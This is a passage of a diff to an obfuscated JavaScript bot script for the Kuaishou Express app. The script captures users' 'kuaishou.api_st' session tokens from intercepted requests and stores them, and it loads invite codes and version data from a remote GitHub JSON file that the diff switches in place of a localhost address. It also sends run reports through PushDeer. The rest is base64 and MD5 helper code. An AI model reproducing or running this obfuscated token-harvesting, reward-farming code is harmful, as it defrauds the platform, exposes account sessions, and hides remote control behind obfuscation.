-    _0x547212 ? _0x547212["indexOf"](_0x4efc86) == -1 && (_0x547212 = _0x547212 + "\n" + _0x4efc86, _0x3de8b8["setdata"](_0x547212, "ksjsbCookie"), ckList = _0x547212["split"]("\n"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第" + ckList["length"] + "个ck成功: " + _0x4efc86))) : (_0x3de8b8["setdata"](_0x4efc86, "ksjsbCookie"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第1个ck成功: " + _0x4efc86)));
+    let D = $request["headers"]['Cookie']['match'](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
+    _0x547212 ? _0x547212["indexOf"](D) == -1 && (_0x547212 = _0x547212 + "\n" + D, _0x3de8b8['setdata'](_0x547212, "ksjsbCookie"), ckList = _0x547212["split"]("\n"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第" + ckList["length"] + "个ck成功: " + D))) : (_0x3de8b8["setdata"](D, "ksjsbCookie"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第1个ck成功: " + D)));
   }
 
   if ($request["url"]["indexOf"]("ksapp/client/package/renew") > -1) {
-    let _0x59efdb = $request["url"]["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
-
-    _0x547212 ? _0x547212["indexOf"](_0x59efdb) == -1 && (_0x547212 = _0x547212 + "\n" + _0x59efdb, _0x3de8b8["setdata"](_0x547212, "ksjsbCookie"), ckList = _0x547212["split"]("\n"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第" + ckList["length"] + "个ck成功: " + _0x59efdb))) : (_0x3de8b8["setdata"](_0x59efdb, "ksjsbCookie"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第1个ck成功: " + _0x59efdb)));
+    let j = $request['url']["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
+    _0x547212 ? _0x547212["indexOf"](j) == -1 && (_0x547212 = _0x547212 + "\n" + j, _0x3de8b8['setdata'](_0x547212, 'ksjsbCookie'), ckList = _0x547212["split"]("\n"), _0x3de8b8['msg'](_0x11b3c3 + (" 获取第" + ckList['length'] + "个ck成功: " + j))) : (_0x3de8b8["setdata"](j, "ksjsbCookie"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第1个ck成功: " + j)));
   }
 }
 
 async function _0x2dc359() {
   if (_0x547212) {
-    let _0x26a2d4 = _0x4c35fe[0];
+    let D = _0x4c35fe[0];
 
-    for (let _0x5f49aa of _0x4c35fe) {
-      if (_0x547212["indexOf"](_0x5f49aa) > -1) {
-        _0x26a2d4 = _0x5f49aa;
+    for (let j of _0x4c35fe) {
+      if (_0x547212['indexOf'](j) > -1) {
+        D = j;
         break;
       }
     }
 
-    for (let _0x2d5985 of _0x547212["split"](_0x26a2d4)) {
-      _0x2d5985 && _0x431ea3["push"](new _0x9d8dda(_0x2d5985));
+    for (let N of _0x547212["split"](D)) {
+      N && _0x431ea3["push"](new _0x9d8dda(N));
     }
 
     _0x19c25c = _0x431ea3["length"];
   } else {
-    console["log"]("未找到CK");
+    console["log"]('未找到CK');
     return;
   }
 
@@ -1123,1322 +1088,1235 @@ async function _0x577f0c() {
   notifyBody = "快手极速版运行通知\n\n" + _0x279d25;
 
   if (_0x113109 > 0) {
-    _0x3de8b8["msg"](notifyBody);
+    _0x3de8b8['msg'](notifyBody);
 
     if (_0x3de8b8["isNode"]()) {
-      var _0x1b2640 = require("./sendNotify");
+      var D = require("./sendNotify");
 
-      await _0x1b2640["sendNotify"](_0x3de8b8["name"], notifyBody);
+      await D['sendNotify'](_0x3de8b8["name"], notifyBody);
     }
   } else {
-    console["log"](notifyBody);
+    console['log'](notifyBody);
   }
 }
 
-function _0x1ab8b7(_0x2242ed) {
-  console["log"](_0x2242ed);
-  _0x279d25 += _0x2242ed;
+function _0x1ab8b7(D) {
+  console["log"](D);
+  _0x279d25 += D;
   _0x279d25 += "\n";
 }
 
-async function _0x282ff5(_0x495bc2) {
+async function _0x282ff5(D) {
   if (!PushDearKey) {
     return;
   }
 
-  if (!_0x495bc2) {
+  if (!D) {
     return;
   }
 
   console["log"]("\n============= PushDear 通知 =============\n");
-  console["log"](_0x495bc2);
-  let _0x27e3c1 = {
-    'url': "https://api2.pushdeer.com/message/push?pushkey=" + PushDearKey + "&text=" + encodeURIComponent(_0x495bc2),
+  console['log'](D);
+  let j = {
+    'url': "https://api2.pushdeer.com/message/push?pushkey=" + PushDearKey + "&text=" + encodeURIComponent(D),
     'headers': {}
   };
-  await _0x39a23b("get", _0x27e3c1);
-
-  let _0x388881 = _0x1a0963,
-      _0x17b8d7 = _0x388881["content"]["result"] == false ? '失败' : '成功';
-
-  console["log"]("\n========== PushDear 通知发送" + _0x17b8d7 + " ==========\n");
+  await _0x39a23b("get", j);
+  let N = _0x1a0963,
+      t = N["content"]['result'] == false ? '失败' : '成功';
+  console["log"]("\n========== PushDear 通知发送" + t + " ==========\n");
 }
 
 async function _0x505e51() {
-  const _0x328d5b = {
-    "url": _0x180c0c,
-    "headers": ''
+  const D = {
+    'url': _0x180c0c,
+    'headers': ''
   };
-  await _0x39a23b("get", _0x328d5b);
-  let _0x1dd192 = _0x1a0963;
+  await _0x39a23b('get', D);
+  let j = _0x1a0963;
 
-  if (!_0x1dd192) {
+  if (!j) {
     return;
   }
 
-  if (_0x1dd192[_0x5bc515]) {
-    let _0x47bef2 = _0x1dd192[_0x5bc515];
-
-    if (_0x47bef2["status"] == 0) {
-      if (_0x459e63 >= _0x47bef2["version"]) {
-        _0x2e716e = true;
-        _0x75eec0 = "https://127.0.0.1/";
-        console["log"](_0x47bef2["msg"][_0x47bef2["status"]]);
-        console["log"](_0x47bef2["updateMsg"]);
-        console["log"]("现在运行的脚本版本是：1.07，最新脚本版本：" + _0x47bef2["latestVersion"]);
-      } else {
-        console["log"](_0x47bef2["versionMsg"]);
-      }
-    } else {
-      console["log"](_0x47bef2["msg"][_0x47bef2["status"]]);
-    }
+  if (j[_0x5bc515]) {
+    let N = j[_0x5bc515];
+    N["status"] == 0 ? _0x459e63 >= N["version"] ? (_0x2e716e = true, _0x75eec0 = "https://raw.githubusercontent.com/public-Object/cloud-JavaScript/main/ks.json", console['log'](N["msg"][N["status"]]), console["log"](N['updateMsg']), console["log"]("现在运行的脚本版本是：1.07，最新脚本版本：" + N["latestVersion"])) : console["log"](N["versionMsg"]) : console["log"](N['msg'][N["status"]]);
   } else {
-    console["log"](_0x1dd192["errorMsg"]);
+    console['log'](j["errorMsg"]);
   }
 }
 
 async function _0x217ea6() {
-  let _0x1613b6 = '';
-  const _0x31b39b = {
-    "url": _0x180c0c,
-    "headers": ''
+  let D = '';
+  const j = {
+    'url': _0x180c0c,
+    'headers': ''
   };
-  await _0x39a23b("get", _0x31b39b);
-  let _0x147d48 = _0x1a0963;
+  await _0x39a23b('get', j);
+  let N = _0x1a0963;
 
-  if (!_0x147d48) {
-    return _0x1613b6;
+  if (!N) {
+    return D;
   }
 
-  for (let _0x361c17 of _0x147d48["invite"]) {
-    if (_0x361c17) {
-      _0x5718d8["push"](_0x361c17);
-    }
+  for (let t of N["invite"]) {
+    t && _0x5718d8["push"](t);
   }
 
-  for (let _0x1414e1 of _0x147d48["ijkkk"]) {
-    _0x1414e1 && yifenk["push"](_0x1414e1);
+  for (let p of N['ijkkk']) {
+    p && yifenk["push"](p);
   }
 
-  return _0x1613b6;
+  return D;
 }
 
-function _0x495d61(_0x162033, _0x485206, _0x4ac334 = '') {
-  let _0x2590bb = _0x162033["replace"]('//', '/')["split"]('/')[1];
-
-  const _0x110665 = {
-    "Host": _0x2590bb,
-    "Cookie": _0x485206
+function _0x495d61(D, j, N = '') {
+  let t = D["replace"]('//', '/')['split']('/')[1];
+  const p = {
+    'Host': t,
+    'Cookie': j
+  },
+        X = {
+    'url': D,
+    'headers': p
   };
-  const _0x19cd48 = {
-    "url": _0x162033,
-    "headers": _0x110665
-  };
-  _0x4ac334 && (_0x19cd48["body"] = _0x4ac334, _0x19cd48["headers"]["Content-Type"] = "application/x-www-form-urlencoded", _0x19cd48["headers"]["Content-Length"] = _0x19cd48["body"] ? _0x19cd48["body"]["length"] : 0);
-  return _0x19cd48;
+  N && (X["body"] = N, X["headers"]["Content-Type"] = "application/x-www-form-urlencoded", X["headers"]["Content-Length"] = X["body"] ? X["body"]['length'] : 0);
+  return X;
 }
 
-async function _0x39a23b(_0x2bab6b, _0x4f3f92) {
+async function _0x39a23b(D, j) {
   _0x1a0963 = null;
-  return new Promise(_0x1768fb => {
-    _0x3de8b8[_0x2bab6b](_0x4f3f92, async (_0x49d219, _0x237ad5, _0x3f2a60) => {
+  return new Promise(N => {
+    _0x3de8b8[D](j, async (t, p, X) => {
       try {
-        if (_0x49d219) {
-          console["log"](_0x2bab6b + "请求失败"), console["log"](JSON["stringify"](_0x49d219)), _0x3de8b8["logErr"](_0x49d219);
-        } else {
-          if (_0x244336(_0x3f2a60)) {
-            _0x1a0963 = JSON["parse"](_0x3f2a60);
-          }
-        }
-      } catch (_0x16ae7e) {
-        _0x3de8b8["logErr"](_0x16ae7e, _0x237ad5);
+        t ? (console['log'](D + "请求失败"), console['log'](JSON['stringify'](t)), _0x3de8b8['logErr'](t)) : _0x244336(X) && (_0x1a0963 = JSON["parse"](X));
+      } catch (L) {
+        _0x3de8b8['logErr'](L, p);
       } finally {
-        _0x1768fb();
+        N();
       }
     });
   });
 }
 
-function _0x244336(_0x5ee830) {
+function _0x244336(D) {
   try {
-    if (typeof JSON["parse"](_0x5ee830) == "object") {
+    if (typeof JSON['parse'](D) == 'object') {
       return true;
     } else {
-      console["log"](_0x5ee830);
+      console["log"](D);
     }
-  } catch (_0x21dc14) {
-    return console["log"](_0x21dc14), console["log"]("服务器访问数据为空，请检查自身设备网络情况"), false;
+  } catch (j) {
+    console['log'](j);
+    console["log"]('服务器访问数据为空，请检查自身设备网络情况');
+    return false;
   }
 }
 
-function _0x271dc5(_0x218011, _0x237c2b) {
-  return _0x218011 < _0x237c2b ? _0x218011 : _0x237c2b;
+function _0x271dc5(D, j) {
+  return D < j ? D : j;
 }
 
-function _0x2be587(_0x11bf22, _0x2d73b0) {
-  return _0x11bf22 < _0x2d73b0 ? _0x2d73b0 : _0x11bf22;
+function _0x2be587(D, j) {
+  return D < j ? j : D;
 }
 
-function _0x4c9db4(_0x5c9bfe, _0x46f484, _0x4661f9 = '0') {
-  let _0x43fb3d = String(_0x5c9bfe),
-      _0x312746 = _0x46f484 > _0x43fb3d["length"] ? _0x46f484 - _0x43fb3d["length"] : 0,
-      _0xcc3f1f = '';
+function _0x4c9db4(D, j, N = '0') {
+  let t = String(D),
+      p = j > t["length"] ? j - t['length'] : 0,
+      X = '';
 
-  for (let _0x1cba81 = 0; _0x1cba81 < _0x312746; _0x1cba81++) {
-    _0xcc3f1f += _0x4661f9;
+  for (let L = 0; L < p; L++) {
+    X += N;
   }
 
-  _0xcc3f1f += _0x43fb3d;
-  return _0xcc3f1f;
+  X += t;
+  return X;
 }
 
-function _0x4b5cde(_0x3e2d7f = 12) {
-  let _0x2a12b1 = "abcdef0123456789",
-      _0x5c804e = _0x2a12b1["length"],
-      _0x586293 = '';
+function _0x4b5cde(D = 12) {
+  let j = "abcdef0123456789",
+      N = j["length"],
+      t = '';
 
-  for (i = 0; i < _0x3e2d7f; i++) {
-    _0x586293 += _0x2a12b1["charAt"](Math["floor"](Math["random"]() * _0x5c804e));
+  for (i = 0; i < D; i++) {
+    t += j["charAt"](Math["floor"](Math["random"]() * N));
   }
 
-  return _0x586293;
+  return t;
 }
 
 var _0x331719 = {
-  '_keyStr': "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
-  'encode': function (_0x3d866c) {
-    var _0x22881f = '';
+  '_keyStr': 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
+  'encode': function (D) {
+    var j = '',
+        N,
+        t,
+        p,
+        X,
+        L,
+        n,
+        z,
+        A = 0;
+    D = _0x331719["_utf8_encode"](D);
 
-    var _0x1acb17, _0x99e842, _0x59eb34, _0x3c64d1, _0x4e005b, _0x1f8816, _0x113b61;
-
-    var _0x56beb5 = 0;
-    _0x3d866c = _0x331719["_utf8_encode"](_0x3d866c);
-
-    while (_0x56beb5 < _0x3d866c["length"]) {
-      _0x1acb17 = _0x3d866c["charCodeAt"](_0x56beb5++);
-      _0x99e842 = _0x3d866c["charCodeAt"](_0x56beb5++);
-      _0x59eb34 = _0x3d866c["charCodeAt"](_0x56beb5++);
-      _0x3c64d1 = _0x1acb17 >> 2;
-      _0x4e005b = (_0x1acb17 & 3) << 4 | _0x99e842 >> 4;
-      _0x1f8816 = (_0x99e842 & 15) << 2 | _0x59eb34 >> 6;
-      _0x113b61 = _0x59eb34 & 63;
-
-      if (isNaN(_0x99e842)) {
-        _0x1f8816 = _0x113b61 = 64;
-      } else {
-        isNaN(_0x59eb34) && (_0x113b61 = 64);
-      }
-
-      _0x22881f = _0x22881f + this["_keyStr"]["charAt"](_0x3c64d1) + this["_keyStr"]["charAt"](_0x4e005b) + this["_keyStr"]["charAt"](_0x1f8816) + this["_keyStr"]["charAt"](_0x113b61);
+    while (A < D["length"]) {
+      N = D["charCodeAt"](A++);
+      t = D["charCodeAt"](A++);
+      p = D["charCodeAt"](A++);
+      X = N >> 2;
+      L = (N & 3) << 4 | t >> 4;
+      n = (t & 15) << 2 | p >> 6;
+      z = p & 63;
+      isNaN(t) ? n = z = 64 : isNaN(p) && (z = 64);
+      j = j + this["_keyStr"]["charAt"](X) + this["_keyStr"]['charAt'](L) + this["_keyStr"]["charAt"](n) + this["_keyStr"]["charAt"](z);
     }
 
-    return _0x22881f;
+    return j;
   },
-  'decode': function (_0x46d0ef) {
-    var _0x2abf2d = '';
+  'decode': function (D) {
+    var j = '',
+        N,
+        t,
+        p,
+        X,
+        L,
+        n,
+        z,
+        A = 0;
+    D = D["replace"](/[^A-Za-z0-9+/=]/g, '');
 
-    var _0xaf658a,
-        _0x5bd0a8,
-        _0x5a3326,
-        _0x112afe,
-        _0x317e49,
-        _0x465732,
-        _0x50949d,
-        _0x3b4383 = 0;
-
-    _0x46d0ef = _0x46d0ef["replace"](/[^A-Za-z0-9+/=]/g, '');
-
-    while (_0x3b4383 < _0x46d0ef["length"]) {
-      _0x112afe = this["_keyStr"]["indexOf"](_0x46d0ef["charAt"](_0x3b4383++));
-      _0x317e49 = this["_keyStr"]["indexOf"](_0x46d0ef["charAt"](_0x3b4383++));
-      _0x465732 = this["_keyStr"]["indexOf"](_0x46d0ef["charAt"](_0x3b4383++));
-      _0x50949d = this["_keyStr"]["indexOf"](_0x46d0ef["charAt"](_0x3b4383++));
-      _0xaf658a = _0x112afe << 2 | _0x317e49 >> 4;
-      _0x5bd0a8 = (_0x317e49 & 15) << 4 | _0x465732 >> 2;
-      _0x5a3326 = (_0x465732 & 3) << 6 | _0x50949d;
-      _0x2abf2d = _0x2abf2d + String["fromCharCode"](_0xaf658a);
-      _0x465732 != 64 && (_0x2abf2d = _0x2abf2d + String["fromCharCode"](_0x5bd0a8));
-      _0x50949d != 64 && (_0x2abf2d = _0x2abf2d + String["fromCharCode"](_0x5a3326));
+    while (A < D["length"]) {
+      X = this["_keyStr"]['indexOf'](D["charAt"](A++));
+      L = this['_keyStr']["indexOf"](D["charAt"](A++));
+      n = this["_keyStr"]["indexOf"](D['charAt'](A++));
+      z = this["_keyStr"]["indexOf"](D["charAt"](A++));
+      N = X << 2 | L >> 4;
+      t = (L & 15) << 4 | n >> 2;
+      p = (n & 3) << 6 | z;
+      j = j + String['fromCharCode'](N);
+      n != 64 && (j = j + String["fromCharCode"](t));
+      z != 64 && (j = j + String["fromCharCode"](p));
     }
 
-    _0x2abf2d = _0x331719["_utf8_decode"](_0x2abf2d);
-    return _0x2abf2d;
+    j = _0x331719['_utf8_decode'](j);
+    return j;
   },
-  '_utf8_encode': function (_0x13de2d) {
-    _0x13de2d = _0x13de2d["replace"](/rn/g, 'n');
-    var _0x4b6922 = '';
+  '_utf8_encode': function (D) {
+    D = D['replace'](/rn/g, 'n');
+    var j = '';
 
-    for (var _0x1b43d9 = 0; _0x1b43d9 < _0x13de2d["length"]; _0x1b43d9++) {
-      var _0x439dca = _0x13de2d["charCodeAt"](_0x1b43d9);
-
-      if (_0x439dca < 128) {
-        _0x4b6922 += String["fromCharCode"](_0x439dca);
-      } else {
-        _0x439dca > 127 && _0x439dca < 2048 ? (_0x4b6922 += String["fromCharCode"](_0x439dca >> 6 | 192), _0x4b6922 += String["fromCharCode"](_0x439dca & 63 | 128)) : (_0x4b6922 += String["fromCharCode"](_0x439dca >> 12 | 224), _0x4b6922 += String["fromCharCode"](_0x439dca >> 6 & 63 | 128), _0x4b6922 += String["fromCharCode"](_0x439dca & 63 | 128));
-      }
+    for (var N = 0; N < D["length"]; N++) {
+      var t = D["charCodeAt"](N);
+      t < 128 ? j += String['fromCharCode'](t) : t > 127 && t < 2048 ? (j += String['fromCharCode'](t >> 6 | 192), j += String["fromCharCode"](t & 63 | 128)) : (j += String["fromCharCode"](t >> 12 | 224), j += String["fromCharCode"](t >> 6 & 63 | 128), j += String['fromCharCode'](t & 63 | 128));
     }
 
-    return _0x4b6922;
+    return j;
   },
-  '_utf8_decode': function (_0x42c30e) {
-    var _0x5849bf = '',
-        _0x5a3020 = 0,
-        _0x41cb37 = c1 = c2 = 0;
+  '_utf8_decode': function (D) {
+    var j = '',
+        N = 0,
+        t = c1 = c2 = 0;
 
-    while (_0x5a3020 < _0x42c30e["length"]) {
-      _0x41cb37 = _0x42c30e["charCodeAt"](_0x5a3020);
-
-      if (_0x41cb37 < 128) {
-        _0x5849bf += String["fromCharCode"](_0x41cb37), _0x5a3020++;
-      } else {
-        _0x41cb37 > 191 && _0x41cb37 < 224 ? (c2 = _0x42c30e["charCodeAt"](_0x5a3020 + 1), _0x5849bf += String["fromCharCode"]((_0x41cb37 & 31) << 6 | c2 & 63), _0x5a3020 += 2) : (c2 = _0x42c30e["charCodeAt"](_0x5a3020 + 1), c3 = _0x42c30e["charCodeAt"](_0x5a3020 + 2), _0x5849bf += String["fromCharCode"]((_0x41cb37 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x5a3020 += 3);
-      }
+    while (N < D['length']) {
+      t = D["charCodeAt"](N);
+      t < 128 ? (j += String["fromCharCode"](t), N++) : t > 191 && t < 224 ? (c2 = D["charCodeAt"](N + 1), j += String["fromCharCode"]((t & 31) << 6 | c2 & 63), N += 2) : (c2 = D["charCodeAt"](N + 1), c3 = D["charCodeAt"](N + 2), j += String['fromCharCode']((t & 15) << 12 | (c2 & 63) << 6 | c3 & 63), N += 3);
     }
 
-    return _0x5849bf;
+    return j;
   }
 };
 
-function _0xcb54a4(_0x32c89f) {
-  function _0x3ccfe3(_0x1496c7, _0x2182e5) {
-    return _0x1496c7 << _0x2182e5 | _0x1496c7 >>> 32 - _0x2182e5;
+function _0xcb54a4(D) {
+  function j(H, x) {
+    return H << x | H >>> 32 - x;
   }
 
-  function _0x177566(_0xb66b66, _0x2b39bd) {
-    var _0x497df2, _0x8dfb10, _0x199caa, _0x7e7ef, _0x4eae60;
-
-    _0x199caa = 2147483648 & _0xb66b66;
-    _0x7e7ef = 2147483648 & _0x2b39bd;
-    _0x497df2 = 1073741824 & _0xb66b66;
-    _0x8dfb10 = 1073741824 & _0x2b39bd;
-    _0x4eae60 = (1073741823 & _0xb66b66) + (1073741823 & _0x2b39bd);
-    return _0x497df2 & _0x8dfb10 ? 2147483648 ^ _0x4eae60 ^ _0x199caa ^ _0x7e7ef : _0x497df2 | _0x8dfb10 ? 1073741824 & _0x4eae60 ? 3221225472 ^ _0x4eae60 ^ _0x199caa ^ _0x7e7ef : 1073741824 ^ _0x4eae60 ^ _0x199caa ^ _0x7e7ef : _0x4eae60 ^ _0x199caa ^ _0x7e7ef;
+  function N(H, x) {
+    var v, Z, Q, I, B;
+    Q = 2147483648 & H;
+    I = 2147483648 & x;
+    v = 1073741824 & H;
+    Z = 1073741824 & x;
+    B = (1073741823 & H) + (1073741823 & x);
+    return v & Z ? 2147483648 ^ B ^ Q ^ I : v | Z ? 1073741824 & B ? 3221225472 ^ B ^ Q ^ I : 1073741824 ^ B ^ Q ^ I : B ^ Q ^ I;
   }
 
-  function _0x23d573(_0x1e0c3f, _0x317ccf, _0x248ae6) {
-    return _0x1e0c3f & _0x317ccf | ~_0x1e0c3f & _0x248ae6;
+  function t(H, x, v) {
+    return H & x | ~H & v;
   }
 
-  function _0x23ce21(_0x4e4056, _0x48f869, _0x2e57a3) {
-    return _0x4e4056 & _0x2e57a3 | _0x48f869 & ~_0x2e57a3;
+  function p(H, x, v) {
+    return H & v | x & ~v;
   }
 
-  function _0x1c0895(_0x226c77, _0x21fdad, _0xc67c6d) {
-    return _0x226c77 ^ _0x21fdad ^ _0xc67c6d;
+  function X(H, x, v) {
+    return H ^ x ^ v;
   }
 
-  function _0x4f34b5(_0x5751d7, _0xc0804f, _0x349601) {
-    return _0xc0804f ^ (_0x5751d7 | ~_0x349601);
+  function L(H, x, v) {
+    return x ^ (H | ~v);
   }
 
-  function _0x272e58(_0x19f37f, _0x4df393, _0xf22e97, _0xd095c4, _0x42c43c, _0x57f59e, _0x1258bf) {
-    _0x19f37f = _0x177566(_0x19f37f, _0x177566(_0x177566(_0x23d573(_0x4df393, _0xf22e97, _0xd095c4), _0x42c43c), _0x1258bf));
-    return _0x177566(_0x3ccfe3(_0x19f37f, _0x57f59e), _0x4df393);
+  function n(H, x, v, Z, Q, I, B) {
+    H = N(H, N(N(t(x, v, Z), Q), B));
+    return N(j(H, I), x);
   }
 
-  function _0x1c6859(_0x2c152e, _0x265f77, _0x5b1ceb, _0x4ce2ed, _0x25a933, _0x56735e, _0x4e5b3b) {
-    _0x2c152e = _0x177566(_0x2c152e, _0x177566(_0x177566(_0x23ce21(_0x265f77, _0x5b1ceb, _0x4ce2ed), _0x25a933), _0x4e5b3b));
-    return _0x177566(_0x3ccfe3(_0x2c152e, _0x56735e), _0x265f77);
+  function z(H, x, v, Z, Q, I, B) {
+    H = N(H, N(N(p(x, v, Z), Q), B));
+    return N(j(H, I), x);
   }
 
-  function _0x1b9794(_0x7a4bd4, _0x582dcd, _0x2d3e34, _0x1b1aba, _0xb61df6, _0x5d1ead, _0x21b1d0) {
-    _0x7a4bd4 = _0x177566(_0x7a4bd4, _0x177566(_0x177566(_0x1c0895(_0x582dcd, _0x2d3e34, _0x1b1aba), _0xb61df6), _0x21b1d0));
-    return _0x177566(_0x3ccfe3(_0x7a4bd4, _0x5d1ead), _0x582dcd);
+  function A(H, x, v, Z, Q, I, B) {
+    H = N(H, N(N(X(x, v, Z), Q), B));
+    return N(j(H, I), x);
   }
 
-  function _0x5641d3(_0x3b678a, _0xee63a5, _0xf92966, _0x1e8c75, _0x471cf6, _0x5d61bc, _0x3f6b9a) {
-    _0x3b678a = _0x177566(_0x3b678a, _0x177566(_0x177566(_0x4f34b5(_0xee63a5, _0xf92966, _0x1e8c75), _0x471cf6), _0x3f6b9a));
-    return _0x177566(_0x3ccfe3(_0x3b678a, _0x5d61bc), _0xee63a5);
+  function l(H, x, v, Z, Q, I, B) {
+    H = N(H, N(N(L(x, v, Z), Q), B));
+    return N(j(H, I), x);
   }
 
-  function _0x5bb69f(_0x5ded76) {
-    for (var _0x26b670, _0x144855 = _0x5ded76["length"], _0x259898 = _0x144855 + 8, _0x5daec3 = (_0x259898 - _0x259898 % 64) / 64, _0x5d033a = 16 * (_0x5daec3 + 1), _0x5e6707 = new Array(_0x5d033a - 1), _0xf3cb10 = 0, _0x49f731 = 0; _0x144855 > _0x49f731;) {
-      _0x26b670 = (_0x49f731 - _0x49f731 % 4) / 4, _0xf3cb10 = _0x49f731 % 4 * 8, _0x5e6707[_0x26b670] = _0x5e6707[_0x26b670] | _0x5ded76["charCodeAt"](_0x49f731) << _0xf3cb10, _0x49f731++;
+  function k(H) {
+    for (var x, v = H["length"], Z = v + 8, Q = (Z - Z % 64) / 64, I = 16 * (Q + 1), B = new Array(I - 1), C = 0, W = 0; v > W;) {
+      x = (W - W % 4) / 4;
+      C = W % 4 * 8;
+      B[x] = B[x] | H["charCodeAt"](W) << C;
+      W++;
     }
 
-    _0x26b670 = (_0x49f731 - _0x49f731 % 4) / 4;
-    _0xf3cb10 = _0x49f731 % 4 * 8;
-    _0x5e6707[_0x26b670] = _0x5e6707[_0x26b670] | 128 << _0xf3cb10;
-    _0x5e6707[_0x5d033a - 2] = _0x144855 << 3;
-    _0x5e6707[_0x5d033a - 1] = _0x144855 >>> 29;
-    return _0x5e6707;
+    x = (W - W % 4) / 4;
+    C = W % 4 * 8;
+    B[x] = B[x] | 128 << C;
+    B[I - 2] = v << 3;
+    B[I - 1] = v >>> 29;
+    return B;
   }
 
-  function _0x455975(_0x34f4fd) {
-    var _0x57d327,
-        _0x596ef8,
-        _0x322e6b = '',
-        _0x3a7570 = '';
+  function d(H) {
+    var x,
+        v,
+        Z = '',
+        Q = '';
 
-    for (_0x596ef8 = 0; 3 >= _0x596ef8; _0x596ef8++) {
-      _0x57d327 = _0x34f4fd >>> 8 * _0x596ef8 & 255;
-      _0x3a7570 = '0' + _0x57d327["toString"](16);
-      _0x322e6b += _0x3a7570["substr"](_0x3a7570["length"] - 2, 2);
+    for (v = 0; 3 >= v; v++) {
+      x = H >>> 8 * v & 255;
+      Q = '0' + x["toString"](16);
+      Z += Q['substr'](Q["length"] - 2, 2);
     }
 
-    return _0x322e6b;
+    return Z;
   }
 
-  function _0x5ec5b4(_0x4cbc95) {
-    _0x4cbc95 = _0x4cbc95["replace"](/\r\n/g, "\n");
+  function T(H) {
+    H = H["replace"](/\r\n/g, "\n");
 
-    for (var _0x19b301 = '', _0x3a786d = 0; _0x3a786d < _0x4cbc95["length"]; _0x3a786d++) {
-      var _0x3f295c = _0x4cbc95["charCodeAt"](_0x3a786d);
-
-      128 > _0x3f295c ? _0x19b301 += String["fromCharCode"](_0x3f295c) : _0x3f295c > 127 && 2048 > _0x3f295c ? (_0x19b301 += String["fromCharCode"](_0x3f295c >> 6 | 192), _0x19b301 += String["fromCharCode"](63 & _0x3f295c | 128)) : (_0x19b301 += String["fromCharCode"](_0x3f295c >> 12 | 224), _0x19b301 += String["fromCharCode"](_0x3f295c >> 6 & 63 | 128), _0x19b301 += String["fromCharCode"](63 & _0x3f295c | 128));
+    for (var x = '', v = 0; v < H["length"]; v++) {
+      var Z = H["charCodeAt"](v);
+      128 > Z ? x += String["fromCharCode"](Z) : Z > 127 && 2048 > Z ? (x += String["fromCharCode"](Z >> 6 | 192), x += String['fromCharCode'](63 & Z | 128)) : (x += String["fromCharCode"](Z >> 12 | 224), x += String["fromCharCode"](Z >> 6 & 63 | 128), x += String['fromCharCode'](63 & Z | 128));
     }
 
-    return _0x19b301;
+    return x;
   }
 
-  var _0x3cc22f,
-      _0x5e1471,
-      _0x1f76d9,
-      _0x11067f,
-      _0x34543f,
-      _0x2b51b8,
-      _0x1ee2f9,
-      _0x570d7d,
-      _0x2bc7e7,
-      _0x15eede = [],
-      _0x418002 = 7,
-      _0x41c55a = 12,
-      _0x5a8f3c = 17,
-      _0xd134ff = 22,
-      _0x2978a2 = 5,
-      _0x16058c = 9,
-      _0x3d2bc0 = 14,
-      _0xd24bdc = 20,
-      _0x30331a = 4,
-      _0x236fa0 = 11,
-      _0x40d552 = 16,
-      _0x2ab77c = 23,
-      _0x56d96e = 6,
-      _0x10a256 = 10,
-      _0xc75d05 = 15,
-      _0x4bcb3e = 21;
+  var U,
+      r,
+      u,
+      m,
+      w,
+      R,
+      e,
+      V,
+      M,
+      O = [],
+      J = 7,
+      Y = 12,
+      i = 17,
+      a = 22,
+      g = 5,
+      h = 9,
+      S = 14,
+      o = 20,
+      G = 4,
+      b = 11,
+      F = 16,
+      s = 23,
+      q = 6,
+      K = 10,
+      P = 15,
+      f = 21;
 
-  for (_0x32c89f = _0x5ec5b4(_0x32c89f), _0x15eede = _0x5bb69f(_0x32c89f), _0x2b51b8 = 1732584193, _0x1ee2f9 = 4023233417, _0x570d7d = 2562383102, _0x2bc7e7 = 271733878, _0x3cc22f = 0; _0x3cc22f < _0x15eede["length"]; _0x3cc22f += 16) {
-    _0x5e1471 = _0x2b51b8;
-    _0x1f76d9 = _0x1ee2f9;
-    _0x11067f = _0x570d7d;
-    _0x34543f = _0x2bc7e7;
-    _0x2b51b8 = _0x272e58(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 0], _0x418002, 3614090360);
-    _0x2bc7e7 = _0x272e58(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 1], _0x41c55a, 3905402710);
-    _0x570d7d = _0x272e58(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 2], _0x5a8f3c, 606105819);
-    _0x1ee2f9 = _0x272e58(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 3], _0xd134ff, 3250441966);
-    _0x2b51b8 = _0x272e58(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 4], _0x418002, 4118548399);
-    _0x2bc7e7 = _0x272e58(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 5], _0x41c55a, 1200080426);
-    _0x570d7d = _0x272e58(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 6], _0x5a8f3c, 2821735955);
